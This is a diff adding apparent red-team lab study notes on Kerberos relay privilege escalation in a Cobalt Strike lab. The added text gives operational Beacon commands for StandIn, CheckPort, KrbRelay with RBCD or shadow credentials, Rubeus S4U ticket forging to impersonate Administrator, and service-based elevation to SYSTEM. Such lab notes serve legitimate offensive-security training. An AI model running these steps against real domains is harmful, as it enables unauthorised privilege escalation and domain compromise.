@@ -278,3 +278,64 @@ Tools like [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) automates most of
 
 For the lab, do the steps manually to understand all of the steps in detail and to know how and what to clean-up (which tools often omit). For the relaying, use the original [KrbRelay](https://github.com/cube0x0/KrbRelay); for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus. This lesson shows how Kerberos relaying can be used to LPE to SYSTEM on WKSTN-2 as bfarmer.
 
+KrbRelay is larger than the default size allowed for Beacon (it uses the large BouncyCastle). Modify Beacon's task size to make it larger: the tasks_max_size setting in Malleable C2 (cannot be applied to existing beacons). To double it, add ```set tasks_max_size "2097152";``` to the top of the C2 profile (results in more lag in the CS client with large tasks). Restart the team server and re-generate payloads after making changes to the Malleable C2 profile.
+
+### RBCD
+
+Need to have control over another computer object to abuse. 
+
+1: Easiest way is to add your own computer object to the domain and get its SID:
+
+    beacon> execute-assembly StandIn.exe --computer EvilComputer --make
+    beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
+
+2: Find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS); can be done with CheckPort in KrbRelay:
+
+    beacon> execute-assembly CheckPort.exe
+    [*] Looking for available ports..
+    [*] SYSTEM Is allowed through port 10
+
+3: Run KrbRelay:
+
+    beacon> execute-assembly KrbRelay.exe -spn <target svc> -clsid <RPC_C_IMP_LEVEL_IMPERSONATE> -rbcd <SID of fake computer account> -port <port>
+    e.g.: beacon> execute-assembly KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f1... -rbcd S-1-5-21... -port 10
+
+Query the Relaying context client returned by KrbRelay to see a new entry in in its msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
+
+    beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+    msds-allowedtoactonbehalfofotheridentity
+    ----------------------------------------
+    {1, 0, 4, 128...}
+
+4: Request a TGT and perform an S4U to obtain a usable service tickets for WKSTN-2 using the password associated with EvilComputer (do _not_ use the FQDN in the msdsspn parameter here):
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19... /nowrap
+    beacon> execute-assembly Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j... /ptt
+
+5: To elevate, use this ticket on the local Service Control Manager over Kerberos to create and start a service binary payload. To streamline this, I've created a BOF and Aggressor Script (in C:\Tools\SCMUACBypass) that registers a new elevate command in Beacon:
+
+    beacon> elevate svc-exe-krb tcp-local
+
+## Shadow Credentials
+
+Use shadow credentials over RBCD to avoid adding a fake computer to the domain. 
+
+1: Verify that WKSTN-2 has nothing in its msDS-KeyCredentialLink attribute:
+
+    beacon> execute-assembly Whisker.exe list /target:wkstn-2$
+
+2: Run KrbRelay as before, but with the -shadowcred parameter:
+
+    beacon> execute-assembly KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f1... -shadowcred -port 10
+
+If get an authentication service is unknown error, reboot the machine or wait for the next clock sync.
+
+KrbRelay provides a full Rubeus command that requests a TGT for WKSTN-2. However, it will return an RC4 ticket. For AES:
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA... /password:"06ce..." /enctype:aes256 /nowrap
+
+The S4U2Self trick can then be used to obtain a HOST service ticket as with RBCD:
+
+    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD... /ptt
+    beacon> elevate svc-exe-krb tcp-local
+
